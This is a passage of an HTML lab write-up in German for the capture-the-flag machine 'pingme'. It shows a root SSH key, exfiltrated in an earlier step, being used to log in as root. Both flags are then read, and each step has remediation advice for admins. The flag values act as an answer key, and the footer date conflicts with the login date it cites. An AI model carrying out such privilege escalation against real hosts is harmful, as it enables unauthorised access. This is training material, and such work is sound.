+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichern Sie den rekonstruierten Schlüssel in einer Datei (z.B. `id_root`). Setzen Sie die korrekten Berechtigungen (`chmod 600 id_root`). Verwenden Sie diesen Schlüssel, um sich als `root` via SSH am Zielsystem anzumelden.<br><strong>Empfehlung (Admin):</strong> Die Exfiltration ist bereits erfolgt. Fokus auf die Behebung der Ursachen (sudo-Regel, unsicheres Skript).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/tajer]
+└─# <span class="command">vi id</span></div>
+                    <pre>[Editor wird geöffnet, der rekonstruierte Key wird eingefügt und gespeichert]</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/tajer]
+└─# <span class="command">chmod 600 id</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der rekonstruierte private SSH-Schlüssel wird auf dem Angreifer-System in eine Datei namens `id` gespeichert. Anschließend werden mit `chmod 600 id` die Dateiberechtigungen korrekt gesetzt, sodass nur der Besitzer Lese- und Schreibrechte hat, was für die Verwendung mit dem `ssh`-Client erforderlich ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitungsschritte zur Verwendung des exfiltrierten Schlüssels.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie nun den Schlüssel für den SSH-Login als Root.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/tajer]
+└─# <span class="command">ssh root@192.168.2.124 -i id</span></div>
+                    <pre>
+Linux pingme 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Mar  6 11:15:54 2022
+root@pingme:~# <span class="password"># Root-Zugriff erfolgreich!</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Angreifer meldet sich per SSH als Benutzer `root` am Zielsystem <span class="command">192.168.2.124</span> an und verwendet dabei den zuvor exfiltrierten und gespeicherten privaten Schlüssel (`-i id`). Der Login ist erfolgreich, und der Angreifer erhält eine Root-Shell.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Privilege Escalation wurde erfolgreich abgeschlossen. Durch Ausnutzung der `sudo`-Regel zur Exfiltration des Root-SSH-Schlüssels über ICMP wurde vollständiger Root-Zugriff auf das System erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff ist erreicht. Suchen und lesen Sie die Root-Flag (`/root/root.txt`) und die User-Flag (`/home/pinger/user.txt`). Dokumentieren Sie den Angriffsweg.<br><strong>Empfehlung (Admin):</strong> Sofortiges Handeln erforderlich. Widerrufen Sie den kompromittierten SSH-Schlüssel (entfernen Sie den zugehörigen öffentlichen Schlüssel aus `/root/.ssh/authorized_keys`). Beheben Sie die `sudo`-Schwachstelle und das unsichere Skript. Überprüfen Sie das System auf weitere Kompromittierungen oder Backdoors.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@pingme:~# <span class="command">ls</span></div>
+                    <pre>root.txt</pre>
+                    <div class="prompt">root@pingme:~# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">HMV{ICMPcanBeAbused}</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Root-Benutzer wird der Inhalt des Home-Verzeichnisses (`/root`) aufgelistet und die Datei `root.txt` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wurde erfolgreich gefunden und gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag dokumentieren.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag selbst, Fokus auf Sicherheitslückenbehebung.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@pingme:~# <span class="command">cd /home</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">root@pingme:/home# <span class="command">ls</span></div>
+                    <pre>pinger</pre>
+                    <div class="prompt">root@pingme:/home# <span class="command">cd pinger</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">root@pingme:/home/pinger# <span class="command">ls</span></div>
+                    <pre>user.txt</pre>
+                    <div class="prompt">root@pingme:/home/pinger# <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">HMV{ICMPisSafe}</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Root-Benutzer wird in das Home-Verzeichnis des Benutzers `pinger` navigiert und die Datei `user.txt` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wurde erfolgreich gefunden und gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag dokumentieren. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag selbst.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">HMV{ICMPisSafe}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">HMV{ICMPcanBeAbused}</span></div>
+                </div>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 5. März 2022</p> <!-- Korrektes Datum aus SSH Last Login extrahiert -->
+    </footer>
+</body>
+</html>
